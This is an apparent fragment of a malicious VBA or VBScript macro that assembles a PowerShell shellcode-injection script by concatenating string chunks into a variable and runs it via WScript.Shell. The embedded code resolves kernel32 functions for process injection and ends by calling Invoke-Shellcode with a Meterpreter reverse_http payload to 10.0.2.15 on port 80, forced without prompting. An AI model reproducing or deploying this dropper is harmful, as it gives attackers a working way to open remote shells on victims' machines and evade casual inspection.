        Mgm = Mgm + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        Mgm = Mgm + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        Mgm = Mgm + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        Mgm = Mgm + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        Mgm = Mgm + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        Mgm = Mgm + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        Mgm = Mgm + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        Mgm = Mgm + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        Mgm = Mgm + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        Mgm = Mgm + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        Mgm = Mgm + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        Mgm = Mgm + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        Mgm = Mgm + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        Mgm = Mgm + "ernel32.dll WriteProcessMemory
        $WriteProce"
        Mgm = Mgm + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        Mgm = Mgm + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        Mgm = Mgm + "()) ([Bool])
        $WriteProcessMemory = [System"
        Mgm = Mgm + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        Mgm = Mgm + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        Mgm = Mgm + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        Mgm = Mgm + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        Mgm = Mgm + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        Mgm = Mgm + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        Mgm = Mgm + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        Mgm = Mgm + "eateRemoteThread = [System.Runtime.InteropServices"
        Mgm = Mgm + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        Mgm = Mgm + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        Mgm = Mgm + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        Mgm = Mgm + " CloseHandle
        $CloseHandleDelegate = Get-De"
        Mgm = Mgm + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        Mgm = Mgm + "le = [System.Runtime.InteropServices.Marshal]::Get"
        Mgm = Mgm + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        Mgm = Mgm + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        Mgm = Mgm + ".ShouldContinue( 'Do you wish to carry out your ev"
        Mgm = Mgm + "il plans?',
                 "Injecting shellcode "
        Mgm = Mgm + "injecting into $((Get-Process -Id $ProcessId).Proc"
        Mgm = Mgm + "essName) ($ProcessId)!" ) )
        {
            "
        Mgm = Mgm + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        Mgm = Mgm + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        Mgm = Mgm + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        Mgm = Mgm + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        Mgm = Mgm + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        Mgm = Mgm + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        Mgm = Mgm + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        Mgm = Mgm + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        Mgm = Mgm + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        Mgm = Mgm + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        Mgm = Mgm + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        Mgm = Mgm + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        Mgm = Mgm + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        Mgm = Mgm + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        Mgm = Mgm + "rocAddress kernel32.dll CreateThread
        $Crea"
        Mgm = Mgm + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        Mgm = Mgm + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        Mgm = Mgm + "IntPtr])
        $CreateThread = [System.Runtime.I"
        Mgm = Mgm + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        Mgm = Mgm + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        Mgm = Mgm + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        Mgm = Mgm + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        Mgm = Mgm + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        Mgm = Mgm + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        Mgm = Mgm + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        Mgm = Mgm + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        Mgm = Mgm + "ForSingleObjectDelegate)
        if ( $Force -or $"
        Mgm = Mgm + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        Mgm = Mgm + " your evil plans?',
                 "Injecting sh"
        Mgm = Mgm + "ellcode into the running PowerShell process!" ) )
"
        Mgm = Mgm + "        {
            Inject-LocalShellcode
      "
        Mgm = Mgm + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        Mgm = Mgm + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        Mgm = Mgm + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(Mgm)
End Function

